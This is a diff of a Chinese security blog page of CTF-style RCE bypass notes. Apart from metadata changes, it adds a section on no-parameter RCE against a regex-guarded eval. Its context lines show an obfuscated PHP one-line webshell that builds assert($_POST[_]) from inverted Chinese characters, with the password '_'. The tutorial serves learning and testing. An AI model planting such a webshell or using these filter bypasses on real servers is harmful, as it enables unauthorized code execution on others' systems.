@@ -29,7 +29,7 @@
 <meta property="og:locale" content="zh_CN">
 <meta property="og:image" content="https://zhmblog-imgs.oss-cn-beijing.aliyuncs.com/%E5%9B%BE%E5%BA%93/20230419162258.png">
 <meta property="article:published_time" content="2023-04-16T12:51:19.000Z">
-<meta property="article:modified_time" content="2023-05-30T03:45:43.170Z">
+<meta property="article:modified_time" content="2023-06-02T14:27:15.397Z">
 <meta property="article:author" content="？？喵！！">
 <meta property="article:tag" content="Rce">
 <meta property="article:tag" content="命令执行与代码执行">
@@ -224,7 +224,7 @@
                   <i class="far fa-calendar-check"></i>
                 </span>
                 <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2023-05-30 11:45:43" itemprop="dateModified" datetime="2023-05-30T11:45:43+08:00">2023-05-30</time>
+                <time title="修改时间：2023-06-02 22:27:15" itemprop="dateModified" datetime="2023-06-02T22:27:15+08:00">2023-06-02</time>
               </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
@@ -249,14 +249,14 @@
                 <i class="far fa-file-word"></i>
               </span>
                 <span class="post-meta-item-text">本文字数：</span>
-              <span>5.3k</span>
+              <span>5.6k</span>
             </span>
             <span class="post-meta-item" title="阅读时长">
               <span class="post-meta-item-icon">
                 <i class="far fa-clock"></i>
               </span>
                 <span class="post-meta-item-text">阅读时长 &asymp;</span>
-              <span>19 分钟</span>
+              <span>20 分钟</span>
             </span>
 
         </div>
@@ -314,7 +314,13 @@
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;(~&#x27;</span>.<span class="title function_ invoke__">urlencode</span>(~<span class="string">&#x27;phpinfo&#x27;</span>).<span class="string">&#x27;)&#x27;</span>;  </span><br></pre></td></tr></table></figure>
 <p>过滤了大部分字符,用汉字取反的一句话木马,密码<code>_</code></p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$__</span>=[];</span><br><span class="line"><span class="variable">$_</span>=(<span class="variable">$__</span>==<span class="variable">$__</span>);</span><br><span class="line"><span class="variable">$__</span>=~(融);</span><br><span class="line"><span class="variable">$___</span>=<span class="variable">$__</span>[<span class="variable">$_</span>];</span><br><span class="line"><span class="variable">$__</span>=~(匆);</span><br><span class="line"><span class="variable">$___</span>.=<span class="variable">$__</span>[<span class="variable">$_</span>].<span class="variable">$__</span>[<span class="variable">$_</span>];</span><br><span class="line"><span class="variable">$__</span>=~(随);</span><br><span class="line"><span class="variable">$___</span>.=<span class="variable">$__</span>[<span class="variable">$_</span>];</span><br><span class="line"><span class="variable">$__</span>=~(千);</span><br><span class="line"><span class="variable">$___</span>.=<span class="variable">$__</span>[<span class="variable">$_</span>];</span><br><span class="line"><span class="variable">$__</span>=~(苦);</span><br><span class="line"><span class="variable">$___</span>.=<span class="variable">$__</span>[<span class="variable">$_</span>];</span><br><span class="line"><span class="variable">$____</span>=~(~(_));</span><br><span class="line"><span class="variable">$__</span>=~(诗);</span><br><span class="line"><span class="variable">$____</span>.=<span class="variable">$__</span>[<span class="variable">$_</span>];</span><br><span class="line"><span class="variable">$__</span>=~(尘);</span><br><span class="line"><span class="variable">$____</span>.=<span class="variable">$__</span>[<span class="variable">$_</span>];</span><br><span class="line"><span class="variable">$__</span>=~(欣);</span><br><span class="line"><span class="variable">$____</span>.=<span class="variable">$__</span>[<span class="variable">$_</span>];</span><br><span class="line"><span class="variable">$__</span>=~(站);</span><br><span class="line"><span class="variable">$____</span>.=<span class="variable">$__</span>[<span class="variable">$_</span>];</span><br><span class="line"><span class="variable">$_</span>=<span class="variable">$$____</span>;</span><br><span class="line"><span class="variable">$___</span>(<span class="variable">$_</span>[_]);<span class="comment">//assert($_POST[_])注释记得删</span></span><br></pre></td></tr></table></figure>
-<h3 id="自增绕过"><a href="#自增绕过" class="headerlink" title="自增绕过"></a>自增绕过</h3>
+<h3 id="自增绕过"><a href="#自增绕过" class="headerlink" title="自增绕过"></a>自增绕过</h3><h2 id="无参数rce"><a href="#无参数rce" class="headerlink" title="无参数rce"></a>无参数rce</h2><p>无参数rce的本质是对如下代码的绕过</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="string">&#x27;;&#x27;</span> === <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[^\W]+\((?R)?\)/&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>])) &#123;    </span><br><span class="line">    <span class="keyword">eval</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>这个正则限制了传入的参数只能是类似于下面这样的形式(套娃模式)</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">a();</span><br><span class="line">a(b());</span><br><span class="line">a(b(c()))</span><br></pre></td></tr></table></figure>
+
+<p>关键在于</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">localeconv</span>() <span class="comment">//返回一个包含本地数字及货币格式信息的数组。</span></span><br><span class="line"><span class="title function_ invoke__">current</span>() <span class="comment">//输出数组中的当前元素的值</span></span><br></pre></td></tr></table></figure>
     </div>
 
     
@@ -399,7 +405,7 @@
 
       <!--noindex-->
       <div class="post-toc-wrap sidebar-panel">
-          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#Linux"><span class="nav-number">1.</span> <span class="nav-text">Linux</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#shell"><span class="nav-number">1.1.</span> <span class="nav-text">shell</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#shell%E5%8F%98%E9%87%8F"><span class="nav-number">1.2.</span> <span class="nav-text">shell变量</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%A9%BA%E6%A0%BC%E7%BB%95%E8%BF%87"><span class="nav-number">1.3.</span> <span class="nav-text">空格绕过</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%85%B3%E9%94%AE%E8%AF%8D%E7%BB%95%E8%BF%87"><span class="nav-number">1.4.</span> <span class="nav-text">关键词绕过</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%86%85%E8%81%94%E6%89%A7%E8%A1%8C-%E5%8F%8D%E5%BC%95%E5%8F%B7"><span class="nav-number">1.4.1.</span> <span class="nav-text">内联执行(反引号)</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%8F%98%E9%87%8F%E6%9B%BF%E6%8D%A2"><span class="nav-number">1.5.</span> <span class="nav-text">变量替换</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%BC%96%E7%A0%81%E7%BB%95%E8%BF%87"><span class="nav-number">1.6.</span> <span class="nav-text">编码绕过</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%85%B6%E4%BB%96%E7%9A%84%E4%B8%80%E4%BA%9B%E7%BB%95%E8%BF%87"><span class="nav-number">1.7.</span> <span class="nav-text">其他的一些绕过</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#escapeshellarg-%E5%92%8Cescapeshellcmd"><span class="nav-number">1.8.</span> <span class="nav-text">escapeshellarg()和escapeshellcmd()</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%97%A0%E5%AD%97%E6%AF%8Dgetshell"><span class="nav-number">1.9.</span> <span class="nav-text">无字母getshell</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%BC%82%E6%88%96%E6%9E%84%E9%80%A0"><span class="nav-number">1.9.1.</span> <span class="nav-text">异或构造</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%8F%96%E5%8F%8D%E7%BB%95%E8%BF%87"><span class="nav-number">1.9.2.</span> <span class="nav-text">取反绕过</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%87%AA%E5%A2%9E%E7%BB%95%E8%BF%87"><span class="nav-number">1.9.3.</span> <span class="nav-text">自增绕过</span></a></li></ol></li></ol></li></ol></div>
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#Linux"><span class="nav-number">1.</span> <span class="nav-text">Linux</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#shell"><span class="nav-number">1.1.</span> <span class="nav-text">shell</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#shell%E5%8F%98%E9%87%8F"><span class="nav-number">1.2.</span> <span class="nav-text">shell变量</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%A9%BA%E6%A0%BC%E7%BB%95%E8%BF%87"><span class="nav-number">1.3.</span> <span class="nav-text">空格绕过</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%85%B3%E9%94%AE%E8%AF%8D%E7%BB%95%E8%BF%87"><span class="nav-number">1.4.</span> <span class="nav-text">关键词绕过</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%86%85%E8%81%94%E6%89%A7%E8%A1%8C-%E5%8F%8D%E5%BC%95%E5%8F%B7"><span class="nav-number">1.4.1.</span> <span class="nav-text">内联执行(反引号)</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%8F%98%E9%87%8F%E6%9B%BF%E6%8D%A2"><span class="nav-number">1.5.</span> <span class="nav-text">变量替换</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%BC%96%E7%A0%81%E7%BB%95%E8%BF%87"><span class="nav-number">1.6.</span> <span class="nav-text">编码绕过</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%85%B6%E4%BB%96%E7%9A%84%E4%B8%80%E4%BA%9B%E7%BB%95%E8%BF%87"><span class="nav-number">1.7.</span> <span class="nav-text">其他的一些绕过</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#escapeshellarg-%E5%92%8Cescapeshellcmd"><span class="nav-number">1.8.</span> <span class="nav-text">escapeshellarg()和escapeshellcmd()</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%97%A0%E5%AD%97%E6%AF%8Dgetshell"><span class="nav-number">1.9.</span> <span class="nav-text">无字母getshell</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%BC%82%E6%88%96%E6%9E%84%E9%80%A0"><span class="nav-number">1.9.1.</span> <span class="nav-text">异或构造</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%8F%96%E5%8F%8D%E7%BB%95%E8%BF%87"><span class="nav-number">1.9.2.</span> <span class="nav-text">取反绕过</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%87%AA%E5%A2%9E%E7%BB%95%E8%BF%87"><span class="nav-number">1.9.3.</span> <span class="nav-text">自增绕过</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%97%A0%E5%8F%82%E6%95%B0rce"><span class="nav-number">1.10.</span> <span class="nav-text">无参数rce</span></a></li></ol></li></ol></div>
       </div>
       <!--/noindex-->
 
@@ -465,13 +471,13 @@
       <i class="fa fa-chart-area"></i>
     </span>
       <span class="post-meta-item-text">站点总字数：</span>
-    <span title="站点总字数">83k</span>
+    <span title="站点总字数">84k</span>
     <span class="post-meta-divider">|</span>
     <span class="post-meta-item-icon">
       <i class="fa fa-coffee"></i>
     </span>
       <span class="post-meta-item-text">站点阅读时长 &asymp;</span>
-    <span title="站点阅读时长">4:57</span>
+    <span title="站点阅读时长">5:01</span>
 </div>
 
 <!--
